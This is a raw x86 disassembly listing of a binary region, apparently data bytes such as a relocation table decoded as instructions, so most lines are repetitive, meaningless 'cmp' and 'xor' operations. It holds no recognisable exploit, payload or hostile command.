  40b1e9:	cmp    cl,BYTE PTR [ebp+0x3b]
  40b1ec:	mov    ds:0xdb3bb13b,al
  40b1f1:	cmp    esp,edx
  40b1f3:	cmp    ebp,ecx
  40b1f5:	cmp    esi,eax
  40b1f7:	cmp    esi,edi
  40b1f9:	cmp    esp,DWORD PTR [ecx]
  40b1fb:	cmp    al,0x41
  40b1fd:	cmp    al,0x52
  40b1ff:	cmp    al,0x70
  40b201:	cmp    al,0x90
  40b203:	cmp    al,0x9a
  40b205:	cmp    al,0xc3
  40b207:	cmp    al,0xdb
  40b209:	cmp    al,0xf3
  40b20b:	cmp    al,0xe
  40b20d:	cmp    eax,0x3d393d28
  40b212:	jns    0x40b251
  40b214:	nop
  40b215:	cmp    eax,0x3da83d99
  40b21a:	mov    cl,0x3d
  40b21c:	sar    BYTE PTR ds:0x3dd83dc9,0xe1
  40b223:	cmp    eax,0x3e1c3df9
  40b228:	daa    
  40b229:	ds cs ds push edi
  40b22d:	ds pop edi
  40b22f:	ds jnp 0x40b270
  40b232:	xlat   BYTE PTR ds:[ebx]
  40b233:	ds pop es
  40b235:	aas    
  40b236:	adc    DWORD PTR [edi],edi
  40b238:	pop    ss
  40b239:	aas    
  40b23a:	and    DWORD PTR [edi],edi
  40b23c:	sub    BYTE PTR [edi],bh
  40b23e:	ss aas 
  40b240:	push   edi
  40b241:	aas    
  40b242:	arpl   WORD PTR [edi],di
  40b244:	ins    DWORD PTR es:[edi],dx
  40b245:	aas    
  40b246:	jle    0x40b287
  40b248:	test   BYTE PTR [edi],bh
  40b24a:	mov    DWORD PTR [edi],edi
  40b24c:	mov    ?,WORD PTR [edi]
  40b24e:	xchg   ebp,eax
  40b24f:	aas    
  40b250:	popf   
  40b251:	aas    
  40b252:	lods   al,BYTE PTR ds:[esi]
  40b253:	aas    
  40b254:	add    BYTE PTR [eax+0x0],al
  40b257:	add    BYTE PTR [eax+0x36000000],bl
  40b25d:	xor    BYTE PTR [ebx+0x30],bl
  40b260:	fbstp  TBYTE PTR [eax]
  40b262:	xor    WORD PTR [ecx-0x15ce27cf],di
  40b269:	xor    DWORD PTR [ecx+0x6e33cf32],edi
  40b26f:	xor    al,0x8b
  40b271:	xor    al,0x91
  40b273:	xor    al,0xe1
  40b275:	xor    al,0xfb
  40b277:	xor    al,0x8
  40b279:	xor    eax,0x35273521
  40b27e:	das    
  40b27f:	xor    eax,0x3557354a
  40b284:	jo     0x40b2bb
  40b286:	xchg   edi,eax
  40b287:	xor    eax,0x35d635b7
  40b28c:	add    esi,DWORD PTR [esi]
  40b28e:	jne    0x40b2c6
  40b290:	mov    esi,DWORD PTR [esi]
  40b292:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b293:	arpl   WORD PTR ss:[edi],si
  40b296:	xchg   ecx,eax
  40b297:	aaa    
  40b298:	sbb    eax,0x50382f38
  40b29d:	cmp    BYTE PTR [ebx-0x64c610c7],bh
  40b2a3:	cmp    edx,edi
  40b2a5:	cmp    ebp,esp
  40b2a7:	cmp    esi,edx
  40b2a9:	cmp    ecx,DWORD PTR [ecx]
  40b2ab:	cmp    al,0x46
  40b2ad:	cmp    al,0x60
  40b2af:	cmp    al,0x96
  40b2b1:	cmp    al,0xa0
  40b2b3:	cmp    al,0xbc
  40b2b5:	cmp    al,0xd0
  40b2b7:	cmp    al,0xf6
  40b2b9:	cmp    al,0x4
  40b2bb:	cmp    eax,0x3d173d09
  40b2c0:	and    eax,0x363d303d
  40b2c5:	cmp    eax,0x3d4e3d3a
  40b2ca:	outs   dx,DWORD PTR ds:[esi]
  40b2cb:	cmp    eax,0x3d8a3d7a
  40b2d0:	(bad)  
  40b2d1:	cmp    eax,0x3dac3da6
  40b2d6:	mov    eax,0xc23dbe3d
  40b2db:	cmp    eax,0x3dd23dce
  40b2e0:	fistp  QWORD PTR ds:0x3e073de5
  40b2e6:	cmp    al,0x3e
  40b2e8:	repnz aas 
  40b2ea:	add    BYTE PTR [eax],al
  40b2ec:	add    BYTE PTR [eax+0x0],dl
  40b2ef:	add    BYTE PTR [eax+eax*1+0x0],ch
  40b2f3:	add    BYTE PTR [edi],dh
  40b2f5:	xor    BYTE PTR [ecx+0x30],bl
  40b2f8:	stos   BYTE PTR es:[edi],al
  40b2f9:	xor    BYTE PTR [eax-0x3cf36d0],dh
  40b2ff:	xor    BYTE PTR [eax+0x31],dl
  40b302:	pushf  
  40b303:	xor    DWORD PTR [edx+0x33],edx
  40b306:	xchg   edi,eax
  40b307:	xor    edi,DWORD PTR [ecx+0x3733ff33]
  40b30d:	xor    al,0xa0
  40b30f:	xor    al,0xe1
  40b311:	xor    al,0xc
  40b313:	xor    eax,0x356a353f
  40b318:	popf   
  40b319:	xor    eax,0x35fc35c8
  40b31e:	mov    dl,0x37
  40b320:	div    DWORD PTR [edi]
  40b322:	sbb    DWORD PTR [eax],edi
  40b324:	pop    edi
  40b325:	cmp    BYTE PTR [ebp+0x5c391938],bl
  40b32b:	cmp    DWORD PTR [edx],edx
  40b32d:	cmp    edx,DWORD PTR [edi+0x3b]
  40b330:	jns    0x40b36d
  40b332:	mov    edi,0x7f3bfb3b
  40b337:	cmp    al,0xc3
  40b339:	cmp    al,0xee
  40b33b:	cmp    al,0x5e
  40b33d:	cmp    eax,0x3daf3d9d
  40b342:	int    0x3d
  40b344:	es ds ss ds push esp
  40b349:	ds popf 
  40b34b:	ds adc eax,0x5e3f4d3f
  40b351:	aas    
  40b352:	xchg   ebp,eax
  40b353:	aas    
  40b354:	mov    eax,0x3f
  40b359:	pusha  
  40b35a:	add    BYTE PTR [eax],al
  40b35c:	and    BYTE PTR [ecx],al
  40b35e:	add    BYTE PTR [eax],al
  40b360:	or     al,0x30
  40b362:	sub    DWORD PTR [eax],esi
  40b364:	mov    al,0x31
  40b366:	xor    DWORD PTR [ebx],0xffffffd2
  40b369:	xor    ecx,DWORD PTR [ebp+0x34]
  40b36c:	push   0xb6349d34
  40b371:	xor    al,0xfd
  40b373:	xor    al,0x2d
  40b375:	xor    eax,0x35b03580
  40b37a:	ret    
  40b37b:	xor    eax,0x373e3642
  40b380:	jge    0x40b3b9
  40b382:	mov    ecx,0x1837e037
  40b387:	cmp    BYTE PTR [eax+edi*1],ah
  40b38a:	sub    bh,BYTE PTR [eax]
  40b38c:	aaa    
  40b38d:	cmp    BYTE PTR [ebp+0x38],cl
  40b390:	push   esi
  40b391:	cmp    BYTE PTR [eax+0x38],ah
  40b394:	imul   edi,DWORD PTR [eax],0x387f3873
  40b39a:	test   DWORD PTR [eax],edi
  40b39c:	mov    WORD PTR [eax],?
  40b39e:	xchg   ebp,eax
  40b39f:	cmp    BYTE PTR [ebx-0x56c75cc8],bl
  40b3a5:	cmp    BYTE PTR [esi-0x3bc741c8],dh
  40b3ab:	cmp    cl,ah
  40b3ad:	cmp    dh,ah
  40b3af:	cmp    ah,ch
  40b3b1:	cmp    cl,dh
  40b3b3:	cmp    dh,dh
  40b3b5:	cmp    bl,bh
  40b3b7:	cmp    BYTE PTR [eax],al
  40b3b9:	cmp    DWORD PTR [esi],eax
  40b3bb:	cmp    DWORD PTR [esi],ecx
  40b3bd:	cmp    DWORD PTR [edx],esi
  40b3bf:	cmp    DWORD PTR [ecx+0x39],ecx
  40b3c2:	cmp    WORD PTR [esi+0x39],di
  40b3c6:	xchg   ebp,eax
  40b3c7:	cmp    DWORD PTR [ebp-0x54c659c7],ebx
  40b3cd:	cmp    DWORD PTR [eax-0x33c639c7],esi
  40b3d3:	cmp    ebx,edx
  40b3d5:	cmp    eax,ebx
  40b3d7:	cmp    ebp,esp
  40b3d9:	cmp    esp,esi
  40b3db:	cmp    esp,edi
  40b3dd:	cmp    DWORD PTR [edx+edi*1],eax
  40b3e0:	sbb    bh,BYTE PTR [edx]
  40b3e2:	and    bh,BYTE PTR [edx]
  40b3e4:	sub    DWORD PTR [edx],edi
  40b3e6:	push   0x783a723a
  40b3eb:	cmp    al,BYTE PTR [edx-0x34c562c6]
  40b3f1:	cmp    dl,cl
  40b3f3:	cmp    bl,bl
  40b3f5:	cmp    ah,cl
  40b3f7:	cmp    ch,dl
  40b3f9:	cmp    ch,bh
  40b3fb:	cmp    ah,BYTE PTR [ecx]
  40b3fd:	cmp    eax,DWORD PTR [ebx+edi*1+0x72]
  40b401:	cmp    ecx,DWORD PTR [esi-0x5dc468c5]
  40b407:	cmp    ebp,DWORD PTR [ecx-0x39c43fc5]
  40b40d:	cmp    ecx,esp
  40b40f:	cmp    edx,edx
  40b411:	cmp    ebx,eax
  40b413:	cmp    ebx,esi
  40b415:	cmp    esp,ebp
  40b417:	cmp    ebp,esp
  40b419:	cmp    esi,ebx
  40b41b:	cmp    edi,edx
  40b41d:	cmp    eax,DWORD PTR [ecx]
  40b41f:	cmp    al,0x8
  40b421:	cmp    al,0xf
  40b423:	cmp    al,0x17
  40b425:	cmp    al,0x1f
  40b427:	cmp    al,0x27
  40b429:	cmp    al,0x33
  40b42b:	cmp    al,0x3c
  40b42d:	cmp    al,0x41
  40b42f:	cmp    al,0x47
  40b431:	cmp    al,0x51
  40b433:	cmp    al,0x5b
  40b435:	cmp    al,0x6b
  40b437:	cmp    al,0x7b
  40b439:	cmp    al,0x81
  40b43b:	cmp    al,0x8c
  40b43d:	cmp    al,0x92
  40b43f:	cmp    al,0x9e
  40b441:	cmp    al,0xae
  40b443:	cmp    al,0xb7
  40b445:	cmp    al,0xcc
  40b447:	cmp    al,0xda
  40b449:	cmp    al,0xeb
  40b44b:	cmp    al,0xf3
  40b44d:	cmp    al,0x9
  40b44f:	cmp    eax,0x3d353d11
  40b454:	ds cmp eax,0x3d9e3d92
  40b45a:	mov    edx,0x313e193d
  40b45f:	ds aaa 
  40b461:	ds inc esi
  40b463:	ds push edx
  40b465:	ds (bad) 
  40b467:	ds cld 
  40b469:	ds push 0x7f3f6d3f
  40b46f:	aas    
  40b470:	popf   
  40b471:	aas    
  40b472:	mov    cl,0x3f
  40b474:	mov    bh,0x3f
  40b476:	add    BYTE PTR [eax],al
  40b478:	add    BYTE PTR [eax+0x0],dh
  40b47b:	add    BYTE PTR [eax+0x0],ch
  40b47e:	add    BYTE PTR [eax],al
  40b480:	jns    0x40b4b2
  40b482:	xchg   esp,eax
  40b483:	xor    BYTE PTR [eax-0x47cf50d0],ah
  40b489:	xor    cl,al
  40b48b:	xor    dh,dl
  40b48d:	xor    bl,ch
  40b48f:	xor    al,bh
  40b491:	xor    BYTE PTR [eax],al
  40b493:	xor    DWORD PTR [ecx+esi*1],esp
  40b496:	xor    dh,BYTE PTR [ecx]
  40b498:	cmp    eax,0xb2315a31
  40b49d:	xor    DWORD PTR [edi-0x27ce33cf],esi
  40b4a3:	xor    esp,esp
  40b4a5:	xor    ecx,esi
  40b4a7:	xor    DWORD PTR [esi],ecx
  40b4a9:	xor    dl,BYTE PTR [eax+0x32]
  40b4ac:	pop    esp
  40b4ad:	xor    ah,BYTE PTR [edx-0x35cd51ce]
  40b4b3:	xor    cl,bh
  40b4b5:	xor    ah,dh
  40b4b7:	xor    bl,BYTE PTR [ecx]
  40b4b9:	xor    ebp,DWORD PTR ds:0x51333333
  40b4bf:	xor    eax,DWORD PTR [edx-0x43cc77cd]
  40b4c5:	xor    eax,eax
  40b4c7:	xor    ecx,eax
  40b4c9:	xor    ecx,esp
  40b4cb:	xor    ebp,eax
  40b4cd:	xor    eax,DWORD PTR [esp+esi*1]
  40b4d0:	or     BYTE PTR [esp],dh
  40b4d3:	xor    al,0x28
  40b4d5:	xor    al,0x30
  40b4d7:	xor    al,0x44
  40b4d9:	xor    al,0x4c
  40b4db:	xor    al,0x54
  40b4dd:	xor    al,0x5c
  40b4df:	xor    al,0x0
  40b4e1:	add    BYTE PTR [eax],0x0
  40b4e4:	or     al,0x0
  40b4e6:	add    BYTE PTR [eax],al
  40b4e8:	adc    al,0x30
  40b4ea:	push   eax
  40b4eb:	xor    BYTE PTR [eax],al
  40b4ed:	nop
  40b4ee:	add    BYTE PTR [eax],al
  40b4f0:	or     al,0x0
  40b4f2:	add    BYTE PTR [eax],al
  40b4f4:	adc    BYTE PTR [edx],dh
	...
